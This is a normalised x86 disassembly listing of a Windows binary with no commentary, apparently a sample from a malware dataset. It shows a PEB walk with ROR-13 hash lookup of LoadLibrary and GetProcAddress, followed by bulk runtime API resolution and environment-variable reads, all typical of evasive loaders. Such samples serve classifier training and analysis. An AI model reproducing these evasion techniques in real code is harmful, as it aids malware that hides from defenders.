mov [ ecx - 0x8 ] eax
lea eax [ ebp - 0x4062c ]
push eax
mov [ ebp - 0x40624 ] edi
push 0x10
jmp r-xdata
mov ecx [ eax + 0x250 ]
mov ebx [ esi + 0xdc ]
add ecx edi
call sub_401104
sub eax [ ebx + 0x250 ]
cmp [ ebx ] 0x0
mov [ ebp - 0x40bec ] eax
je r-xdata
mov ecx [ eax + 0x258 ]
and [ ebp - 0x40be8 ] 0x0
add ecx edi
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0xdc ]
mov [ ebp - 0x4062c ] edi
push [ eax + 0x1c ]
call [ esi + 0x54 ]
lea eax [ ebp - 0x104 ]
push eax
mov eax [ esi + 0xdc ]
push 0x100
push [ eax + 0x26c ]
call [ esi + 0x54 ]
mov edi [ ebp - 0x40bec ]
mov eax [ esi + 0xdc ]
mov eax [ eax + 0x250 ]
mov edx [ ebp - 0x40be4 ]
lea ecx [ eax + edi + 0x4 ]
call sub_401104
mov [ ebp - 0x40be4 ] eax
call sub_401104
mov edx [ ebp - 0x40be4 ]
mov ebx eax
mov eax [ esi + 0xdc ]
mov eax [ eax + 0x258 ]
lea ecx [ eax + edi + 0x4 ]
call sub_401104
mov [ ebp - 0x40be8 ] eax
and ebx 0xfffffff0
call sub_401104
mov ebx eax
and ebx 0xfffffff8
jmp r-xdata
mov eax [ esi + 0xdc ]
mov ecx [ eax + 0x258 ]
mov edi [ ebp - 0x40c00 ]
push [ ebp - 0x40be8 ]
add ecx [ eax + 0x20 ]
mov edx edi
call sub_40116e
mov eax [ esi + 0xdc ]
pop ecx
mov ecx [ eax + 0x25c ]
add ecx [ eax + 0x20 ]
mov edx edi
call sub_401104
mov eax [ esi + 0xdc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ eax + 0x258 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x40c00 ]
lea ecx [ ecx + eax + 0x4 ]
call sub_401104
mov eax [ esi + 0xdc ]
mov ecx [ eax + 0x258 ]
add ecx [ eax + 0x20 ]
mov edx [ ebp - 0x40c00 ]
call sub_401104
mov eax [ esi + 0xdc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ esi + 0xdc ]
mov ecx [ eax + 0x25c ]
add ecx [ eax + 0x20 ]
push 0x0
xor ebx ebx
mov edx edi
call sub_40116e
pop ecx
xor eax eax
mov ecx [ eax + 0x25c ]
mov eax [ eax + 0x20 ]
lea ecx [ ecx + eax + 0x4 ]
mov edx edi
call sub_401104
sub_40237a
cmp [ eax ] 0x0
push esi
mov esi ecx
mov ecx eax
je r-xdata
mov dl [ esi ]
mov [ ecx ] dl
test dl dl
je r-xdata
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
pop esi
retn
sub esi ecx
inc ecx
mov dl [ esi + ecx ]
mov [ ecx ] dl
test dl dl
jne r-xdata
sub_4023a0
mov eax [ esi + 0xdc ]
push edi
push r--data
push [ eax + 0x40 ]
call [ esi + 0x4 ]
mov edi 0x100
mov ecx edi
lea ecx [ eax - 0x1 ]
jmp r-xdata
dec ecx
jne r-xdata
mov dl [ ecx - 0x1 ]
mov eax [ esi + 0xdc ]
test dl dl
jne r-xdata
mov dl [ eax ]
inc eax
cmp dl 0xc3
je r-xdata
movzx ecx dl
mov ecx [ ecx - 0x4 ]
jmp r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
dec ecx
jne r-xdata
push r--data
mov [ eax + 0x24c ] ecx
push [ eax + 0x40 ]
call [ esi + 0x4 ]
mov ecx edi
mov dl [ ecx - 0x2 ]
mov eax [ esi + 0xdc ]
test dl dl
jne r-xdata
mov dl [ eax ]
inc eax
cmp dl 0xc2
je r-xdata
movzx ecx dl
mov ecx [ ecx - 0x5 ]
jmp r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
dec ecx
jne r-xdata
mov [ eax + 0x254 ] ecx
add ecx 0x4
push r--data
mov [ eax + 0x250 ] ecx
push [ eax + 0x40 ]
call [ esi + 0x4 ]
mov ecx edi
mov dl [ ecx + 0x2 ]
test dl dl
je r-xdata
mov dl [ eax ]
inc eax
cmp dl 0x8d
je r-xdata
mov ecx [ ecx + 0x1 ]
cmp dl 0x1
je r-xdata
dec eax
jmp r-xdata
dec edi
jne r-xdata
movzx ecx dl
jmp r-xdata
mov ecx [ esi + 0xdc ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x25c ] eax
pop edi
retn
mov cl [ eax ]
inc eax
cmp cl 0x5d
je r-xdata
xor eax eax
mov eax [ esi + 0xdc ]
push r--data
mov [ eax + 0x258 ] ecx
push [ eax + 0x40 ]
call [ esi + 0x4 ]
sub_40248e
mov eax [ eax + 0xdc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x254 ] 0x180
mov [ eax + 0x258 ] 0x208
mov ecx [ eax + 0x254 ]
add ecx 0x8
mov [ eax + 0x250 ] ecx
mov [ eax + 0x25c ] 0x260
retn
mov [ eax + 0x254 ] 0x2e0
mov [ eax + 0x258 ] 0x348
mov ecx [ eax + 0x254 ]
add ecx 0x8
mov [ eax + 0x250 ] ecx
mov [ eax + 0x25c ] 0x3a0
retn
sub_4024f6
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
call [ esi + 0xa8 ]
mov [ ebp - 0x128 ] eax
call [ esi + 0x94 ]
mov [ ebp - 0x124 ] eax
mov eax [ esi ]
lea ecx [ eax + 0x208 ]
push ecx
add eax 0x9e
push eax
call [ esi + 0x70 ]
push eax
call [ esi + 0x4 ]
xor ebx ebx
mov [ esi + 0x64 ] eax
cmp eax ebx
je r-xdata
mov eax [ esi ]
add eax 0xa7
push eax
call [ esi + 0x70 ]
mov ecx [ esi ]
add ecx 0x69a
push ecx
push eax
call [ esi + 0x4 ]
lea ecx [ ebp - 0x110 ]
push ecx
push ebx
push ebx
push 0xb
mov [ ebp - 0x11c ] eax
call eax
push [ ebp - 0x110 ]
push 0x8
push [ ebp - 0x124 ]
call [ esi + 0x98 ]
mov edi eax
lea eax [ ebp - 0x110 ]
push eax
push [ ebp - 0x110 ]
push edi
push 0xb
call [ ebp - 0x11c ]
push 0x100
lea eax [ ebp - 0x104 ]
push ebx
push eax
call sub_407580
lea eax [ edi + 0x20 ]
mov cl [ eax ]
add esp 0xc
mov [ ebp - 0x104 ] cl
test cl cl
je r-xdata
mov eax [ esi + 0xdc ]
add eax 0x3c
push eax
call [ esi + 0x68 ]
push eax
call [ esi + 0x64 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0xdc ]
mov edx [ edi + 0xc ]
mov [ ecx + 0x244 ] edx
lea ecx [ ebp - 0x104 ]
mov [ ebp - 0x10c ] ecx
mov ecx [ esi ]
mov edx [ ecx + 0x6fe ]
mov [ ebp - 0x114 ] ebx
lea edx [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov eax [ esi + 0xdc ]
mov [ eax + 0x3c ] ebx
inc [ ebp - 0x10c ]
cmp [ ebp - 0x105 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x10c ]
mov [ ebp - 0x114 ] ebx
inc [ ebp - 0x10c ]
mov ecx [ ebp - 0x10c ]
mov cl [ ecx ]
inc edx
mov [ edx ] cl
test cl cl
jne r-xdata
mov ebx [ ebp - 0x10c ]
mov bl [ ebx ]
mov [ ebp - 0x105 ] bl
movsx ebx bl
cmp ebx edx
jne r-xdata
mov edx [ esi + 0xdc ]
xor ebx ebx
cmp [ edx + 0x3c ] ebx
je r-xdata
mov eax [ esi + 0xdc ]
cmp [ eax + 0x3c ] 0x0
jne r-xdata
mov [ ebp - 0x118 ] ebx
cmp ebx [ edi ]
jae r-xdata
mov edi 0x100
push edi
add eax 0x44
push eax
call [ esi + 0x7c ]
mov ecx [ esi ]
mov eax [ esi + 0xdc ]
add ecx 0x6d6
add eax 0x44
call sub_40237a
mov eax [ esi + 0xdc ]
mov ecx [ ebp - 0x114 ]
add eax 0x44
call sub_40237a
mov eax [ esi + 0xdc ]
push edi
add edi 0x44
add eax edi
push eax
call [ esi + 0x7c ]
mov ecx [ esi ]
mov eax [ esi + 0xdc ]
add ecx 0x6ea
add eax edi
call sub_40237a
mov eax [ ebp - 0x114 ]
inc eax
push eax
call [ esi + 0x8 ]
mov ecx [ esi + 0xdc ]
mov [ ecx + 0x40 ] eax
jmp r-xdata
je r-xdata
add ecx 0x6b8
mov edx ecx
sub edx edi
mov [ ebp - 0x120 ] ecx
mov [ ebp - 0x10c ] eax
sub edx 0x20
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
lea edx [ ebx + 0xa ]
mov edi 0x100000
push edi
push 0x8
push [ ebp - 0x124 ]
call [ esi + 0x98 ]
mov [ ebp - 0x110 ] edi
xor edi edi
push edi
push edi
mov ebx eax
push edi
lea eax [ ebp - 0x12c ]
push eax
call [ esi + 0x68 ]
push eax
call [ esi + 0x68 ]
push eax
call [ esi + 0x68 ]
push eax
call [ esi + 0x80 ]
lea eax [ ebp - 0x110 ]
push eax
push [ ebp - 0x110 ]
push ebx
push 0x10
call [ ebp - 0x11c ]
mov ecx [ ebx ]
xor eax eax
cmp ecx edi
jbe r-xdata
mov eax [ esi + 0xdc ]
imul ebx ebx 0x11c
mov ecx [ ebx + edi + 0xc ]
mov [ eax + 0x248 ] ecx
cmp [ ebp - 0x120 ] 0x0
jne r-xdata
mov eax [ ebp - 0x120 ]
test eax eax
je r-xdata
inc eax
add edx 0x10
cmp eax ecx
jb r-xdata
mov di [ edx ]
cmp di [ ebp - 0x12c ]
je r-xdata
movsx eax [ ecx ]
lea ebx [ eax - 0x41 ]
cmp ebx 0x19
ja r-xdata
mov eax [ ebp - 0x10c ]
movsx eax [ eax ]
jmp r-xdata
cmp ebx [ edi ]
movsx eax [ eax ]
neg eax
jmp r-xdata
mov edi [ ebp - 0x128 ]
cmp [ edx - 0x6 ] edi
jne r-xdata
jmp r-xdata
mov ecx [ esi + 0xdc ]
add eax eax
mov eax [ ebx + eax * 8 + 0xc ]
mov [ ecx + 0x20 ] eax
mov [ ebp - 0x105 ] al
movsx eax [ edx + ecx ]
lea ebx [ eax - 0x41 ]
cmp ebx 0x19
ja r-xdata
add al 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x105 ] al
jne r-xdata
add al 0x20
mov eax 0x11c
add [ ebp - 0x10c ] eax
inc ebx
sub edx eax
mov [ ebp - 0x118 ] ebx
cmp ebx [ edi ]
jb r-xdata
mov ebx [ ebp - 0x118 ]
movsx ecx al
movsx eax [ ebp - 0x105 ]
sub eax ecx
cmp [ ecx ] 0x0
je r-xdata
mov ecx [ ebp - 0x10c ]
test ecx ecx
jne r-xdata
inc ecx
jmp r-xdata
sub_402850
push ebp
mov ebp esp
sub esp 0x204
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1f8 ] esi
call sub_40308e
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
mov eax [ ebx + 0x3c ]
mov eax [ eax + ebx + 0x78 ]
add eax ebx
mov ecx [ eax + 0x20 ]
mov edx [ eax + 0x24 ]
add ecx ebx
mov [ ebp - 0x1fc ] ecx
mov ecx [ eax + 0x1c ]
mov eax [ eax + 0x18 ]
push edi
xor edi edi
and [ ebp - 0x1f0 ] edi
and [ ebp - 0x10c ] edi
add edx ebx
add ecx ebx
mov [ ebp - 0x114 ] edx
mov [ ebp - 0x1f4 ] edi
mov [ ebp - 0x204 ] eax
test eax eax
je r-xdata
pop edi
mov edx [ ebp - 0x10c ]
mov eax [ ebp - 0x1fc ]
mov eax [ eax + edx * 4 ]
add eax ebx
mov [ ebp - 0x200 ] eax
mov [ ebp - 0x108 ] 0xe
xor edx edx
mov [ ebp - 0x110 ] eax
mov eax [ ebp - 0x110 ]
movsx eax [ eax ]
dec [ ebp - 0x108 ]
ror edx 0xd
add edx eax
inc [ ebp - 0x110 ]
cmp [ ebp - 0x108 ] 0x0
jne r-xdata
cmp edx 0x7c0dfcaa
jne r-xdata
mov edx [ ebp - 0x200 ]
mov [ ebp - 0x110 ] 0xc
xor eax eax
mov [ ebp - 0x108 ] edx
mov eax [ ebp - 0x114 ]
mov edx [ ebp - 0x10c ]
movzx eax [ eax + edx * 2 ]
mov edi [ ecx + eax * 4 ]
add edi ebx
mov [ ebp - 0x1f4 ] edi
jmp r-xdata
mov edx [ ebp - 0x108 ]
movsx edx [ edx ]
dec [ ebp - 0x110 ]
ror eax 0xd
add eax edx
inc [ ebp - 0x108 ]
cmp [ ebp - 0x110 ] 0x0
jne r-xdata
cmp eax 0xec0e4e8e
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x114 ]
mov edx [ ebp - 0x10c ]
movzx eax [ eax + edx * 2 ]
mov eax [ ecx + eax * 4 ]
add eax ebx
mov [ ebp - 0x1f0 ] eax
inc [ ebp - 0x10c ]
mov eax [ ebp - 0x10c ]
cmp eax [ ebp - 0x204 ]
jb r-xdata
cmp [ ebp - 0x1f0 ] 0x0
jne r-xdata
jmp r-xdata
lea eax [ esi + 0xdc ]
push eax
push ebx
call edi
mov [ ebp - 0x1ec ] eax
lea eax [ esi + 0xe9 ]
push eax
push ebx
call edi
mov [ ebp - 0x1e8 ] eax
lea eax [ esi + 0x12c ]
push eax
push ebx
call edi
mov [ ebp - 0x1d4 ] eax
lea eax [ esi + 0x11a ]
push eax
push ebx
call edi
mov [ ebp - 0x1d8 ] eax
lea eax [ esi + 0x14e ]
push eax
push ebx
call edi
mov [ ebp - 0x1cc ] eax
lea eax [ esi + 0x15b ]
push eax
push ebx
call edi
mov [ ebp - 0x1c8 ] eax
lea eax [ esi + 0x167 ]
push eax
push ebx
call edi
mov [ ebp - 0x1c4 ] eax
lea eax [ esi + 0xf8 ]
push eax
push ebx
call edi
mov [ ebp - 0x1e4 ] eax
lea eax [ esi + 0x104 ]
push eax
push ebx
call edi
mov [ ebp - 0x1e0 ] eax
lea eax [ esi + 0x10e ]
push eax
push ebx
call edi
mov [ ebp - 0x1dc ] eax
lea eax [ esi + 0x1bb ]
push eax
push ebx
call edi
mov [ ebp - 0x1ac ] eax
lea eax [ esi + 0x1c7 ]
push eax
push ebx
call edi
mov [ ebp - 0x1a8 ] eax
lea eax [ esi + 0xad ]
push eax
call [ ebp - 0x1f0 ]
lea ecx [ esi + 0x173 ]
push ecx
push eax
mov [ ebp - 0x108 ] eax
call edi
mov [ ebp - 0x1c0 ] eax
lea eax [ esi + 0x181 ]
push eax
push [ ebp - 0x108 ]
call edi
mov [ ebp - 0x1bc ] eax
lea eax [ esi + 0x1a1 ]
push eax
push [ ebp - 0x108 ]
call edi
mov [ ebp - 0x1b8 ] eax
lea eax [ esi + 0x192 ]
push eax
push [ ebp - 0x108 ]
call edi
mov [ ebp - 0x1b4 ] eax
lea eax [ esi + 0xa7 ]
push eax
call [ ebp - 0x1f0 ]
lea ecx [ esi + 0x1b5 ]
push ecx
push eax
call edi
mov [ ebp - 0x1b0 ] eax
lea eax [ esi + 0xb5 ]
push eax
call [ ebp - 0x1f0 ]
lea ecx [ esi + 0x139 ]
push ecx
push eax
call edi
mov [ ebp - 0x1d0 ] eax
lea eax [ esi + 0xbd ]
push eax
call [ ebp - 0x1f0 ]
lea ecx [ esi + 0x1d2 ]
push ecx
push eax
mov [ ebp - 0x10c ] eax
call edi
mov [ ebp - 0x1a4 ] eax
lea eax [ esi + 0x1e0 ]
push eax
push [ ebp - 0x10c ]
call edi
mov [ ebp - 0x1a0 ] eax
lea eax [ esi + 0x1ee ]
push eax
push [ ebp - 0x10c ]
call edi
mov [ ebp - 0x19c ] eax
lea eax [ esi + 0x1fb ]
push eax
push [ ebp - 0x10c ]
call edi
mov [ ebp - 0x198 ] eax
lea eax [ esi + 0x36a ]
push eax
push [ ebp - 0x10c ]
call edi
mov [ ebp - 0x140 ] eax
lea eax [ esi + 0x208 ]
push eax
push ebx
call edi
mov [ ebp - 0x194 ] eax
lea eax [ esi + 0x217 ]
push eax
push ebx
call edi
mov [ ebp - 0x190 ] eax
lea eax [ esi + 0x229 ]
push eax
push ebx
call edi
mov [ ebp - 0x18c ] eax
lea eax [ esi + 0x23b ]
push eax
push ebx
call edi
mov [ ebp - 0x188 ] eax
lea eax [ esi + 0x24f ]
push eax
push ebx
call edi
mov [ ebp - 0x184 ] eax
lea eax [ esi + 0x25a ]
push eax
push ebx
call edi
mov [ ebp - 0x180 ] eax
lea eax [ esi + 0x264 ]
push eax
push ebx
call edi
mov [ ebp - 0x17c ] eax
lea eax [ esi + 0x282 ]
push eax
push ebx
call edi
mov [ ebp - 0x178 ] eax
lea eax [ esi + 0x296 ]
push eax
push ebx
call edi
mov [ ebp - 0x174 ] eax
lea eax [ esi + 0x2a0 ]
push eax
push ebx
call edi
mov [ ebp - 0x170 ] eax
lea eax [ esi + 0x2b4 ]
push eax
push ebx
call edi
mov [ ebp - 0x16c ] eax
lea eax [ esi + 0x2c8 ]
push eax
push ebx
call edi
mov [ ebp - 0x168 ] eax
lea eax [ esi + 0x2dc ]
push eax
push ebx
call edi
mov [ ebp - 0x164 ] eax
lea eax [ esi + 0x2f0 ]
push eax
push ebx
call edi
mov [ ebp - 0x160 ] eax
lea eax [ esi + 0x304 ]
push eax
push ebx
call edi
mov [ ebp - 0x15c ] eax
lea eax [ esi + 0x318 ]
push eax
push ebx
call edi
mov [ ebp - 0x158 ] eax
lea eax [ esi + 0x32c ]
push eax
push ebx
call edi
mov [ ebp - 0x154 ] eax
lea eax [ esi + 0x340 ]
push eax
push ebx
call edi
mov [ ebp - 0x150 ] eax
lea eax [ esi + 0x354 ]
push eax
push ebx
call edi
mov [ ebp - 0x14c ] eax
lea eax [ esi + 0xc3 ]
push eax
call [ ebp - 0x1f0 ]
mov ebx eax
lea eax [ esi + 0x35e ]
push eax
push ebx
call edi
mov [ ebp - 0x148 ] eax
lea eax [ esi + 0x364 ]
push eax
push ebx
call edi
mov [ ebp - 0x144 ] eax
nop
nop
nop
nop
lea eax [ esi + 0xd2 ]
push eax
call [ ebp - 0x188 ]
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ esi + 0x3da ]
push eax
push ebx
call edi
mov [ ebp - 0x13c ] eax
lea eax [ esi + 0x3e4 ]
push eax
push ebx
call edi
mov [ ebp - 0x138 ] eax
lea eax [ esi + 0x3ee ]
push eax
push ebx
call edi
mov [ ebp - 0x134 ] eax
lea eax [ esi + 0x3f8 ]
push eax
push ebx
call edi
mov [ ebp - 0x130 ] eax
lea eax [ esi + 0x402 ]
push eax
push ebx
call edi
mov [ ebp - 0x128 ] eax
lea eax [ esi + 0x420 ]
push eax
push ebx
call edi
mov [ ebp - 0x12c ] eax
lea eax [ esi + 0x416 ]
push eax
push ebx
call edi
mov [ ebp - 0x120 ] eax
lea eax [ esi + 0x40c ]
push eax
push ebx
call edi
mov [ ebp - 0x124 ] eax
xor eax eax
cmp [ ebp - 0x1ec ] eax
je r-xdata
lea eax [ esi + 0xd2 ]
push eax
call [ ebp - 0x1f0 ]
mov ebx eax
cmp [ ebp - 0x1e8 ] eax
je r-xdata
cmp [ ebp - 0x1d4 ] eax
je r-xdata
cmp [ ebp - 0x1d8 ] eax
je r-xdata
cmp [ ebp - 0x1cc ] eax
je r-xdata
cmp [ ebp - 0x1c8 ] eax
je r-xdata
cmp [ ebp - 0x1e4 ] eax
je r-xdata
cmp [ ebp - 0x1e0 ] eax
je r-xdata
cmp [ ebp - 0x1dc ] eax
je r-xdata
cmp [ ebp - 0x1ac ] eax
je r-xdata
cmp [ ebp - 0x1c0 ] eax
je r-xdata
cmp [ ebp - 0x1bc ] eax
je r-xdata
cmp [ ebp - 0x1b8 ] eax
je r-xdata
cmp [ ebp - 0x1b4 ] eax
je r-xdata
cmp [ ebp - 0x1b0 ] eax
je r-xdata
cmp [ ebp - 0x1a8 ] eax
je r-xdata
cmp [ ebp - 0x1a4 ] eax
je r-xdata
cmp [ ebp - 0x1a0 ] eax
je r-xdata
cmp [ ebp - 0x194 ] eax
je r-xdata
cmp [ ebp - 0x190 ] eax
je r-xdata
cmp [ ebp - 0x18c ] eax
je r-xdata
cmp [ ebp - 0x148 ] eax
je r-xdata
cmp [ ebp - 0x144 ] eax
je r-xdata
cmp [ ebp - 0x19c ] eax
je r-xdata
cmp [ ebp - 0x198 ] eax
je r-xdata
cmp [ ebp - 0x188 ] eax
je r-xdata
cmp [ ebp - 0x184 ] eax
je r-xdata
cmp [ ebp - 0x180 ] eax
je r-xdata
cmp [ ebp - 0x17c ] eax
je r-xdata
cmp [ ebp - 0x178 ] eax
je r-xdata
cmp [ ebp - 0x174 ] eax
je r-xdata
cmp [ ebp - 0x16c ] eax
je r-xdata
cmp [ ebp - 0x140 ] eax
je r-xdata
cmp [ ebp - 0x168 ] eax
je r-xdata
cmp [ ebp - 0x164 ] eax
je r-xdata
cmp [ ebp - 0x15c ] eax
je r-xdata
cmp [ ebp - 0x160 ] eax
je r-xdata
cmp [ ebp - 0x158 ] eax
je r-xdata
cmp [ ebp - 0x13c ] eax
je r-xdata
cmp [ ebp - 0x150 ] eax
je r-xdata
cmp [ ebp - 0x14c ] eax
je r-xdata
cmp [ ebp - 0x138 ] eax
je r-xdata
cmp [ ebp - 0x134 ] eax
je r-xdata
cmp [ ebp - 0x130 ] eax
je r-xdata
cmp [ ebp - 0x128 ] eax
je r-xdata
cmp [ ebp - 0x124 ] eax
je r-xdata
cmp [ ebp - 0x12c ] eax
je r-xdata
cmp [ ebp - 0x120 ] eax
je r-xdata
lea eax [ esi + 0x569 ]
push eax
call [ ebp - 0x16c ]
call [ ebp - 0x164 ]
mov ebx 0x1218
push ebx
push 0x8
push eax
call [ ebp - 0x160 ]
mov [ ebp - 0x11c ] eax
push esi
lea eax [ esi + 0x4fb ]
push eax
mov edi 0x100
lea eax [ ebp - 0x104 ]
push edi
push eax
call [ ebp - 0x13c ]
add esp 0x10
lea eax [ ebp - 0x104 ]
push eax
call [ ebp - 0x16c ]
push ebx
lea eax [ esi + 0x523 ]
push eax
lea eax [ ebp - 0x104 ]
push edi
push eax
call [ ebp - 0x13c ]
add esp 0x10
lea eax [ ebp - 0x104 ]
push eax
call [ ebp - 0x16c ]
lea eax [ esi + 0x541 ]
push eax
call [ ebp - 0x16c ]
lea ecx [ ebp - 0x1f8 ]
call sub_401403
add esi 0x555
push esi
call [ ebp - 0x16c ]
sub_40308e
push ebp
mov ebp esp
push ecx
push ecx
or [ ebp - 0x8 ] 0xffffffff
push esi
call sub_403087
mov esi [ eax + 0xc ]
add esi 0x14
mov eax [ esi ]
cmp eax esi
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
leave
retn
push ebx
push edi
mov eax [ eax ]
cmp eax esi
jne r-xdata
mov edx [ eax + 0x20 ]
shr ecx 0x1
lea ecx [ edx + ecx * 2 - 0x1a ]
mov [ ebp - 0x4 ] 0xd
xor edi edi
mov edx ecx
movzx ecx [ eax + 0x1c ]
test cx cx
je r-xdata
jmp r-xdata
movsx ebx [ edx ]
dec [ ebp - 0x4 ]
ror edi 0xd
add edi ebx
add edx 0x2
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp edi 0x8fecdbff
je r-xdata
pop edi
pop ebx
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
push 0xd
pop edi
xor edx edx
movsx ebx [ ecx ]
ror edx 0xd
add edx ebx
add ecx 0x2
dec edi
jne r-xdata
cmp edx 0x6e2bcfd7
je r-xdata
sub_403121
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
push 0x10
call sub_4046a3
mov esi eax
pop ecx
mov [ ebp - 0x40 ] esi
mov [ esi + 0x8 ] rw-data
mov [ esi + 0xc ] 0xb
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x1c
call sub_401000
push 0x1
mov ebx 0x200
push ebx
mov [ ebp - 0xc ] eax
call sub_404a19
pop ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
pop ecx
lea ecx [ eax + 0x2 ]
xor edi edi
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax ecx
sar eax 0x1
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0xc ]
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
push edi
push edi
push [ ebp - 0x34 ]
sub eax ecx
push [ ebp - 0x20 ]
sar eax 0x1
add eax eax
push eax
push [ ebp - 0xc ]
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0xe
call sub_401000
push 0x1
push ebx
mov [ ebp - 0x10 ] eax
call sub_404a19
pop ecx
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
pop ecx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax ecx
sar eax 0x1
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
push edi
push edi
push [ ebp - 0x34 ]
sub eax ecx
push [ ebp - 0x24 ]
sar eax 0x1
add eax eax
push eax
push [ ebp - 0x10 ]
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x52
call sub_401000
push 0x1
push ebx
mov [ ebp - 0x14 ] eax
call sub_404a19
pop ecx
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x14 ]
pop ecx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax ecx
sar eax 0x1
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
push edi
push edi
push [ ebp - 0x34 ]
sub eax ecx
push [ ebp - 0x28 ]
sar eax 0x1
add eax eax
push eax
push [ ebp - 0x14 ]
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x10
call sub_401000
push 0x1
push ebx
mov [ ebp - 0x18 ] eax
call sub_404a19
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x18 ]
pop ecx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax ecx
sar eax 0x1
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x18 ]
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
push edi
push edi
push [ ebp - 0x34 ]
sub eax ecx
push [ ebp - 0x8 ]
sar eax 0x1
add eax eax
push eax
push [ ebp - 0x18 ]
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0xe
call sub_401000
push 0x1
push ebx
mov [ ebp - 0x1c ] eax
call sub_404a19
pop ecx
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x1c ]
pop ecx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax ecx
sar eax 0x1
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
push edi
push edi
push [ ebp - 0x34 ]
sub eax ecx
push [ ebp - 0x2c ]
sar eax 0x1
add eax eax
push eax
push [ ebp - 0x1c ]
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x18
call sub_401000
push 0x1
push ebx
mov esi eax
call sub_404a19
pop ecx
mov [ ebp - 0x30 ] eax
mov eax esi
pop ecx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax ecx
sar eax 0x1
mov [ ebp - 0x34 ] eax
mov eax esi
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
push edi
push edi
push [ ebp - 0x34 ]
sub eax ecx
push [ ebp - 0x30 ]
sar eax 0x1
add eax eax
push eax
push esi
push edi
push edi
call [ WideCharToMultiByte@IAT ]
push 0x1
push ebx
call sub_404a19
push 0x1
push ebx
mov [ ebp - 0x38 ] eax
call sub_404a19
mov edi eax
push 0x1
push ebx
mov [ ebp - 0x34 ] edi
call sub_404a19
add esp 0x18
push ebx
push edi
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call [ GetEnvironmentVariableA@IAT ]
mov eax [ ebp - 0x28 ]
mov esi eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
push ebx
push [ ebp - 0x4 ]
mov ecx eax
push [ ebp - 0x8 ]
and ecx 0x3
[ edi ] [ esi ]
call [ GetEnvironmentVariableA@IAT ]
mov eax [ ebp - 0x30 ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ ebp - 0x4 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
push 0x0
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
push 0x2
push 0x2
push 0x0
push 0x2
mov ecx eax
push 0x4
